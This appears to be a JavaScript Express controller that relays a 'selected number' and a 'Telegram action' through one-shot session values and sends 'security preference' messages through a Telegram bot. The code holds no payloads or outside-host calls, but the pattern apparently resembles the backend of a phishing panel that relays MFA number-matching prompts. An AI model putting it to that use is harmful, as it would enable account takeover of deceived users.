import { sendSecurityPreference } from "../telegramBot.js";
import { getSession, setSession } from "../sessionStore.js";

export async function setSelectedNumber(req, res) {
  const { sessionId, number } = req.body;

  if (!sessionId) {
    return res.status(401).json({
      success: false,
      message: "No session ID provided.",
    });
  }

  const session = await getSession(sessionId);

  if (!session) {
    return res.status(401).json({
      success: false,
      message: "Invalid session.",
    });
  }

  session.selectedNumber = number;
  await setSession(sessionId, session);

  res.json({
    success: true,
    number: session.selectedNumber,
  });
}

export async function setTelegramAction(req, res) {
  const { sessionId, action } = req.body;

  const session = await getSession(sessionId);

  if (!session) {
    return res.status(401).json({
      success: false,
      message: "Invalid session.",
    });
  }

  session.telegramAction = action;
  await setSession(sessionId, session);

  res.json({
    success: true,
  });
}

export async function getSelectedNumber(req, res) {
  const sessionId = req.cookies.sessionId || req.body.sessionId;

  if (!sessionId) {
    return res.status(401).json({
      success: false,
      message: "No session found.",
    });
  }

  const session = await getSession(sessionId);

  if (!session) {
    return res.status(401).json({
      success: false,
      message: "Invalid session.",
    });
  }

  const number = session.selectedNumber;

  session.selectedNumber = null;
  await setSession(sessionId, session);

  res.json({
    success: true,
    number,
  });
}

export async function getTelegramAction(req, res) {
  const sessionId = req.cookies.sessionId || req.body.sessionId;

  const session = await getSession(sessionId);

  if (!session) {
    return res.status(401).json({
      success: false,
      message: "Invalid session.",
    });
  }

  const action = session.telegramAction;

  session.telegramAction = null;
  await setSession(sessionId, session);

  res.json({
    success: true,
    action,
  });
}

export async function sendSecurityPreferenceMessage(req, res) {
  try {
    const sessionId = req.cookies.sessionId || req.body.sessionId;

    if (!sessionId) {
      return res.status(401).json({
        success: false,
        message: "No session found.",
      });
    }

    const { variant } = req.body;

    await sendSecurityPreference(sessionId, variant);

    res.json({
      success: true,
    });
  } catch (error) {
    console.error("Failed to send Telegram message:", error);

    res.status(500).json({
      success: false,
      message: error.message,
    });
  }
}